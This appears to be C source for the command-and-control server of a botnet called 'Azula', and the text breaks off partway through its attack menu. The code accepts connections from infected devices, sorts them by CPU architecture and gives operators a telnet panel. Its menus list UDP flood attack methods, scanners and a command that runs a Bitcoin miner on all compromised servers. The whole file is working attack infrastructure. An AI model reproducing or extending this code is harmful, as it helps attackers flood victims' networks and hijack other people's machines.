/*
Hi (: - Simple greet from Cri
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
////////////////////////////////////////////
#include "resolver.h" 
////////////////////////////////////////////
#define MAXFDS 1000000
////////////////////////////////////////////
struct account 
{
  char user[200];
  char Password[200];
  char id [200];
};
static struct account accounts[500];
////////////////////////////////////////////
struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];
////////////////////////////////////////////
////////////////////////////////////////////
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
////////////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
////////////////////////////////////////////
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
////////////////////////////////////////////
static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}
////////////////////////////////////////////
static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
////////////////////////////////////////////
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
        int dup = 0;
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
          if(!clients[ipIndex].connected || ipIndex == infd) continue;
          if(clients[ipIndex].ip == clients[infd].ip) {
            dup = 1;
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "!* KOSHA ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}
////////////////////////////////////////////
unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}
////////////////////////////////////////////
void *titleWriter(void *sock) 
{
  int thefd = (long int)sock;
  char string[2048];
  while(1)
    {
        memset(string, 0, 2048);
        sprintf(string, "%c]0; Азула | VStack(s): %d | Administrators: %d %c", '\033', clientsConnected(), managesConnected, '\007');
        if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
        sleep(2);
    }
}
////////////////////////////////////////////
int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("Azula.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
////////////////////////////////////////////
void client_addr(struct sockaddr_in addr) {
  printf("\x1b[1;37m[\x1b[0;31m%d.%d.%d.%d\x1b[1;37m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("Azula_IP.log", "a");
  fprintf(logFile, "\n\x1b[1;37m[\x1b[0;31m%d.%d.%d.%d\x1b[1;37m]",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}
////////////////////////////////////////////
void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char buf[2048];
  char* nickstring;
  char Username[80];
  char* Password;
  char *admin = "admin"; 
  char *normal = "normal";
  memset(buf, 0, sizeof buf);
  char panel[2048];
  memset(panel, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("Azula.txt", "r");
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].Password, accounts[j].id); 
    ++j;
  }

  char Prompt_1 [500];
  char Prompt_2 [500];
  char Prompt_3 [500];
  sprintf(Prompt_1,  "\x1b[1;37mДобро пожаловать в \x1b[0;31mАзула.\r\n");
  sprintf(Prompt_2,  "\x1b[1;37mЕсли вы не знаете, что это, \x1b[0;31mзакройте это окно.\r\n");
  sprintf(Prompt_3,  "\x1b[1;37mЕсли вы находитесь в правильном месте, введите свои учетные \x1b[0;31mданные ниже.\r\n");
        
  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_2, strlen(Prompt_2), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_3, strlen(Prompt_3), MSG_NOSIGNAL) == -1) goto end;

  sprintf(panel, "\x1b[0;31mИмя пользователя сети\x1b[1;37m: ");
  if (send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(Username, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

    char yeet [500];
    char yeet2 [500];
    sprintf(yeet, "\x1b[1;37mПроверка учетных данных\r\n");
    sleep(1);
    sprintf(yeet2, "\x1b[1;37mПользователь принят, Добро пожаловать, \x1b[0;31m%s\r\n", accounts[find_line].user, buf);
    //sleep(1);
    if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(panel, "\x1b[0;31mСетевой пароль\x1b[1;37m: ");
    if (send(thefd, yeet, strlen(yeet), MSG_NOSIGNAL) == -1) goto end;
    if (send(thefd, yeet2, strlen(yeet2), MSG_NOSIGNAL) == -1) goto end;
    if (send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].Password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto Azula;
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];
        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");
        sprintf(failed_line1, "\x1b[1;37mLogin \x1b[0;31mError\x1b[1;37m!\r\n");
        sprintf(failed_line2, "\x1b[1;37mIf you run into this issue please contact the \x1b[0;31mowner\x1b[1;37m!\r\n");
        sleep(1);
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
        sleep(3);
        goto end;
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Azula: 
        pthread_create(&title, NULL, &titleWriter, sock); 
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; 
        char Azula_1 [90000];
        char Azula_2 [90000];
        char Azula_3 [90000];
        char Azula_4 [90000];
        char Azula_5 [90000];
        char Azula_6 [90000];
        char Azula_7 [90000];
        char Azula_8 [90000];
        char Azula_9 [90000];
        sprintf(Azula_1, "\x1b[0;31m                     d8888                   888          \r\n");
        sprintf(Azula_2, "\x1b[0;31m                    d88888                   888          \r\n");
        sprintf(Azula_3, "\x1b[0;31m                   d88P888                   888          \r\n");
        sprintf(Azula_4, "\x1b[0;31m                  d88P 888 88888888 888  888 888  8888b.  \r\n");
        sprintf(Azula_5, "\x1b[0;31m                 d88P  888    d88P  888  888 888      88b \r\n");
        sprintf(Azula_6, "\x1b[0;31m                d88P   888   d88P   888  888 888 .d888888 \r\n");
        sprintf(Azula_7, "\x1b[0;31m               d8888888888  d88P    Y88b 888 888 888  888 \r\n");
        sprintf(Azula_8, "\x1b[0;31m              d88P     888 88888888   Y88888 888  Y888888 \r\n");
        sprintf(Azula_9, "\x1b[1;37m        Where the Feds cant track us And the Skids cant hack us\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_1, strlen(Azula_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_2, strlen(Azula_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_3, strlen(Azula_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_4, strlen(Azula_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_5, strlen(Azula_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_6, strlen(Azula_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_7, strlen(Azula_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_8, strlen(Azula_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_9, strlen(Azula_9), MSG_NOSIGNAL) == -1) goto end;
        while(1) 
        { 
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf); 
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end; 
        break;
        } 
        pthread_create(&title, NULL, &titleWriter, sock); 
        managements[thefd].connected = 1; 
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  
        {
          if(strcmp(admin, accounts[find_line].id) == 0)
          {
            char AdminHelp_1 [500];
            char AdminHelp_2 [500];
            char AdminHelp_3 [500];
            char AdminHelp_4 [500];
            char AdminHelp_5 [500];
            char AdminHelp_6 [500];
            char AdminHelp_7 [500];
            char AdminHelp_8 [500];
            char AdminHelp_9 [500];
            char AdminHelp_10 [500];
            char AdminHelp_11 [500];
            char AdminHelp_12 [500];
            char AdminHelp_13 [500];
            char AdminHelp_14 [500];
            char AdminHelp_15 [500];
            char AdminHelp_16 [500];
            char AdminHelp_17 [500];
            char AdminHelp_18 [500];
            sprintf(AdminHelp_1, "\x1b[1;37mCommand    Description\r\n");
            sprintf(AdminHelp_2, "\x1b[0;31m--------   -----------\r\n");
            sprintf(AdminHelp_3, "\x1b[0;31mLoader       \x1b[1;37mShows a list of available Attack Commands\r\n");
            sprintf(AdminHelp_4, "\x1b[0;31mInfo       \x1b[1;37mShows your current account information\r\n");
            sprintf(AdminHelp_5, "\x1b[0;31mexit       \x1b[1;37mGracefully closes the current session\r\n");
            sprintf(AdminHelp_6, "\x1b[0;31mvStack     \x1b[1;37mShows a list of all currently Connected devices\r\n");
            sprintf(AdminHelp_7, "\x1b[0;31mDeploy     \x1b[1;37mRuns a BTC Miner on all servers\r\n");
            sprintf(AdminHelp_8, "\x1b[0;31mAdd        \x1b[1;37mAdds a user account\r\n");
            sprintf(AdminHelp_9, "\x1b[0;31mSAP        \x1b[1;37mSets an API on the current Server\r\n");
            sprintf(AdminHelp_10, "\x1b[0;31mCAP        \x1b[1;37mSets a Chatroom on the current server\r\n");
            sprintf(AdminHelp_11, "\x1b[0;31mIPSP       \x1b[1;37mInstalls All IPHM Based Methods on current server\r\n");
            sprintf(AdminHelp_12, "\x1b[0;31mSCDL       \x1b[1;37mInstalls all External Scripts on current server\r\n");
            sprintf(AdminHelp_13, "\x1b[0;31mSysInfo    \x1b[1;37mDisplays a list of current server information\r\n");
            sprintf(AdminHelp_14, "\x1b[0;31mShowUsers  \x1b[1;37mDisplays a list of all Users in LogFile\r\n");
            sprintf(AdminHelp_15, "\x1b[0;31mBan        \x1b[1;37mKills all future connections with desired IP\r\n");
            sprintf(AdminHelp_16, "\x1b[0;31mSCMenu     \x1b[1;37mDisplays a list of available scanners\r\n");
            sprintf(AdminHelp_17, "\x1b[0;31mLinks      \x1b[1;37mSomething extra.\r\n");
            sprintf(AdminHelp_18, "\x1b[0;31mToolkit    \x1b[1;37mShows a list of all available tools.\r\n");
            if(send(thefd, AdminHelp_1, strlen(AdminHelp_1), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_2, strlen(AdminHelp_2), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_3, strlen(AdminHelp_3), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_4, strlen(AdminHelp_4), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_5, strlen(AdminHelp_5), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_6, strlen(AdminHelp_6), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_7, strlen(AdminHelp_7), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_8, strlen(AdminHelp_8), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_9, strlen(AdminHelp_9), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_10, strlen(AdminHelp_10), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_11, strlen(AdminHelp_11), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_12, strlen(AdminHelp_12), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_13, strlen(AdminHelp_13), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_14, strlen(AdminHelp_14), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_15, strlen(AdminHelp_15), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_16, strlen(AdminHelp_16), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_17, strlen(AdminHelp_17), MSG_NOSIGNAL) == -1) return;
            if(send(thefd, AdminHelp_18, strlen(AdminHelp_18), MSG_NOSIGNAL) == -1) return;
          }
          else if(strcmp(normal, accounts[find_line].id) == 0)
          {
          char NormalHelp_1 [5000];
          char NormalHelp_2 [5000];
          char NormalHelp_3 [5000];
          char NormalHelp_4 [5000];
          char NormalHelp_5 [5000];
          char NormalHelp_6 [5000];
          sprintf(NormalHelp_1, " \x1b[1;37mCommand    Description\r\n");
          sprintf(NormalHelp_2, " \x1b[0;31m--------   -----------\r\n");
          sprintf(NormalHelp_3, " \x1b[0;31mLoader       \x1b[1;37mShows a list of available Attack Commands\r\n");
          sprintf(NormalHelp_4, " \x1b[0;31mInfo       \x1b[1;37mShows your current account information\r\n");
          sprintf(NormalHelp_5, " \x1b[0;31mexit       \x1b[1;37mGracefully closes the current session\r\n");
          sprintf(NormalHelp_6, " \x1b[0;31mToolkit    \x1b[1;37mShows a list of all available tools.\r\n");
          if(send(thefd, NormalHelp_1, strlen(NormalHelp_1), MSG_NOSIGNAL) == -1) return;
          if(send(thefd, NormalHelp_2, strlen(NormalHelp_2), MSG_NOSIGNAL) == -1) return;
          if(send(thefd, NormalHelp_3, strlen(NormalHelp_3), MSG_NOSIGNAL) == -1) return;
          if(send(thefd, NormalHelp_4, strlen(NormalHelp_4), MSG_NOSIGNAL) == -1) return;
          if(send(thefd, NormalHelp_5, strlen(NormalHelp_5), MSG_NOSIGNAL) == -1) return;
          if(send(thefd, NormalHelp_6, strlen(NormalHelp_6), MSG_NOSIGNAL) == -1) return;
        }
        while(1) 
        {
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf);
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
         if(strstr(buf, "clear") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "CLS"))  
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_1, strlen(Azula_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_2, strlen(Azula_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_3, strlen(Azula_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_4, strlen(Azula_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_5, strlen(Azula_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_6, strlen(Azula_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Azula_7, strlen(Azula_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_8, strlen(Azula_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Azula_9, strlen(Azula_9), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf);
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
          
          char str[100];
          sprintf(panel, "Enter a user: \n", buf);
          gets( str );
          char cmd[4096];
          sprintf(cmd, "echo -e '%s'", str);
          //sets()
          //printf( "\nYou entered: ");
          //puts( str );
          return 0;
          if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        //int user,pass,type;
        //char print1;
        //char print2;
        //char print3;
        //char name[10];
        //sprintf(print1, "Enter your name: \n");
        //fgets(name, 10, stdin);
        //char pass[10];
        //sprintf(print2, "Enter your pass: \n");
        //fgets(pass, 10, stdin);
        //char type[10];
        //sprintf(print3, "Enter your type: \n");
        //fgets(type, 10, stdin);
        ////sprintf(panel, "Enter the month and year: \n", buf);
        ////scanf("%d%d",&month,&year);
        //char cmd[4096];
        //sprintf(cmd, "echo '%s %s %s' >> test.txt", name, pass, type);
        //scanf("%s %s %s", &name,&pass,&type);
        //system(cmd);
        //printf("%s %s %s",name,pass,type);
        }
         if(strstr(buf, "info") || strstr(buf, "INFO") || strstr(buf, "INFORMATION") || strstr(buf, "information"))  
        {
        char user_user [500];
        char user_pass [500];
        char user_ip [500];
        char user_level [500];
        char user_time [500];

        sprintf(user_user,  "\x1b[1;37mUsername:\x1b[0;31m %s\r\n", accounts[find_line].user, buf);
        sprintf(user_pass,  "\x1b[1;37mPassword:\x1b[0;31m %s\r\n", accounts[find_line].Password, buf);
        sprintf(user_ip,    "\x1b[1;37mUser IP: \x1b[0;31mCOMING SOON\r\n");
        sprintf(user_level, "\x1b[1;37mUser Level:\x1b[0;31m %s\r\n", accounts[find_line].id, buf);
        sprintf(user_time,  "\x1b[1;37mTime Left: \x1b[0;31mCOMING SOON\r\n");
        if(send(thefd, user_user, strlen(user_user), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_pass, strlen(user_pass), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_ip, strlen(user_ip), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_level, strlen(user_level), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_time, strlen(user_time), MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(panel, "\x1b[1;30m[\x1b[0;31m%s\x1b[1;30m/\x1b[0;31mАзула\x1b[1;30m/\x1b[0;31m%s\x1b[1;30m]~\x1b[0;31m$\x1b[1;37m ", accounts[find_line].user, accounts[find_line].id, buf);
        if(send(thefd, panel, strlen(panel), MSG_NOSIGNAL) == -1) goto end;
        break; 
        }
        continue;
        }
        if(strstr(buf, "STRESS") || strstr(buf, "stress") || strstr(buf, "Loader") || strstr(buf, "Loader") || strstr(buf, "Loader")) 
        {
        char LoaderMenu_Line_1  [5000];
        char LoaderMenu_Line_2  [5000];
        char LoaderMenu_Line_3  [5000];
        char LoaderMenu_Line_4  [5000];
        char LoaderMenu_Line_5  [5000];
        char LoaderMenu_Line_6  [5000];
        char LoaderMenu_Line_7  [5000];
        char LoaderMenu_Line_8  [5000];
        char LoaderMenu_Line_9  [5000];
        sprintf(LoaderMenu_Line_1,   "\x1b[1;37mMethod  Usage                                                        Description\r\n");
        sprintf(LoaderMenu_Line_2,   "\x1b[0;31m------  -----                                                        -----------\r\n");
        sprintf(LoaderMenu_Line_3,   "\x1b[0;31mSTD     $STD \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m]                                      \x1b[1;37mModified UDP Attack with Hexidemical Payload\r\n");
        sprintf(LoaderMenu_Line_4,   "\x1b[0;31mUDP     $UDP \x1b[1;37m[\x1b[1;31mIP\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPORT\x1b[1;37m] \x1b[1;37m[\x1b[0;31mTIME\x1b[1;37m] 32 \x1b[1;37m[\x1b[0;31mPSIZE\x1b[1;37m] \x1b[1;37m[\x1b[0;31mPINTERVAL\x1b[1;37m]               \x1b[1;37mUDP Attack\r\n");
